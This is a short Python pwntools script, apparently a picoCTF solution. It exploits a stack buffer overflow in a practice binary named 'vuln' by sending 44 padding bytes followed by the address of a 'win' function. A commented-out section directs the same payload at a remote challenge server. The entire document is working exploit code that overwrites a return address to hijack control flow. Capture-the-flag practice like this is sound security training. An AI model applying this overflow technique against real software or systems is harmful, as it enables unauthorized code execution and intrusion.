#!/usr/bin/python3

from pwn import *

offset = 44

e = ELF('./vuln')

payload = b'A' * offset
payload += p32(e.symbols['win'])

p = process('./vuln')
p.sendline(payload)
p.interactive()
'''
r = remote("saturn.picoctf.net", 62620)
r.recvline()
r.sendline(payload)
r.interactive()
'''
